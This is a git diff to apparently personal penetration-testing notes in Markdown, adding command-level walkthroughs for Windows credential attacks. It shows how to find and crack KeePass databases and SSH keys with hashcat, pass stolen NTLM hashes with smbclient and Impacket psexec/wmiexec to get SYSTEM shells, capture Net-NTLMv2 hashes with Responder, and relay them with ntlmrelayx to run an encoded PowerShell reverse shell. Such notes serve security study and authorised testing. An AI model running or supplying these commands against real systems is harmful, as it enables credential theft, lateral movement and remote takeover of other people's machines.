@@ -59,7 +59,20 @@ hashcat -m passman.mode passman.hash rockyou.txt -r rockyou-30000.rule --force
 ```
 Common rules: `/usr/share/hashcat/rules/` (for rockyou: `rockyou-30000.rule`)
 
-## Ssh passphrase
+## JohnTheRipper
+
+### Keepass cracking
+
+Find the database on Windows: `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` \
+Then upload it on Kali: https://github.com/ThomasBucaioni/pentools/blob/main/filetransfer/readme.md#powershell \
+And crack it with JohnTheRipper:
+```
+keepass2john Database.kdbx > keepass_hashfile.txt
+hashcat --help | grep -i keepass # mode number for KeePass: 13400
+hashcat -m keepass_mode_number keepass_hashfile.txt /u/s/w/rockyou.txt -r /u/s/hashcat/rules/rockyou-30000.rule --force
+```
+
+### Ssh passphrase cracking
 
 ```
 ssh2john id_rsa > ssh.hash
@@ -101,33 +114,59 @@ mimikatz # lsadump::sam
 ```
 Take the hashes back to Kali:
 ```
-hashcat -h | grep -i ntlm # get the NTLM code: 1000
+hashcat -h | grep -i ntlm # get the NTLM mode code: 1000
 hashcat -m ntlm_mode_code user_hash.txt /u/s/w/rockyou.txt -r /u/s/h/r/best64.rule --force
 ```
 
 ## Pass NTLM
 
-```
-smbclient \\\\IpVictim\\someshare -U Administrator --pw-nt-hash adminhash # smb> get file.txt
-impacket-psexec -hashes 00000000000000000000000000000000:adminhash Administrator@IpVictim # nt authority\system
-impacket-wmiexec -hashes 00000000000000000000000000000000:adminhash Administrator@IpVictim # host\administrator
+Tools to pass-the-hash:
+- SMB enumeration and attack: 
+    - `smbclient`
+    - CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec
+- get an _interactive shell_ with Impacket: https://github.com/fortra/impacket
+    - [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
+    - [wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)
 
+Steal the Administrator's hash or Workstation_1 and connect to a Samba share on Workstation_2 (if same password...):
+```
+kali$ smbclient \\\\IpVictim_Workstation_2\\someshare -U Administrator --pw-nt-hash adminhash # pass the local "Administrator" account hash on WS_1
+    smb: \> get somepassfile.txt # in the Samba share, get files
+```
+Get an interactive shell, if same Administrator hash/password on both Workstation_1 and Workstation_2:
+```
+kali$ impacket-psexec -hashes 00000000000000000000000000000000:adminhash Administrator@IpVictim_Workstation_2 # nt authority\system
+kali$ impacket-wmiexec -hashes 00000000000000000000000000000000:adminhash Administrator@IpVictim_Workstation_2 # host\administrator
 ```
 
 ## Net-NTLMv2
 
-Kali
+When taking control of a low privilege user (with/without password), Mimikatz can't extract hashes.
+The [Responder](https://github.com/lgandx/Responder) can catch the hash from a connection request from this user to crack it (if password unknown).
+
+On Kali, run the responder:
 ```
 sudo responder -I ethX
 ```
-Windows
+On Windows, with the compromised user (unknown password), send a connection request to the responder to get the hash:
 ```
 smb \\IpAtt\fakeshare
 ```
-then `hashcat`
+then crack the password with `hashcat`:
+```
+hashcat --help | grep -i ntlm
+hashcat -m ntlm_v2_mode_code lowprivuser_hash.txt /u/s/w/rockyou.txt --force
+```
+Once we know the password, we can connect to other stations with this user. For example, until we find one where he/she is a local administrator an run Mimikatz.
 
 ## Relay Net-NTLMv2
 
+If the Net-NTLMv2 password is too complex and can't be cracked, its hash can still be exploited to connect to other stations:
 ```
-sudo impacket-ntlmrelayx --no-http-server -smb2support -t IpVictim -c "powershell -enc base64reverseshell"
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t IpVictim_Workstation_2 -c "powershell -enc base64_reverse_shell_long_string"
 ```
+From Workstation_1, the connection to Kali is relayed to Workstation_2, which accepts the Net-NTLMv2 hash for connection. \
+If the low privilege user is a local administrator on Workstation_2, the SAM hashes can be dumped or passed with Mimikatz. \
+Relaying the Net-NTLMv2 hash on Workstation_2 needs "User Access Control remote restrictions" to be disabled for low privilege users. If UAC remote restrictions is enabled, the Net-NTLMv2 relay attack still works with the local _Administrator_ account
+
+
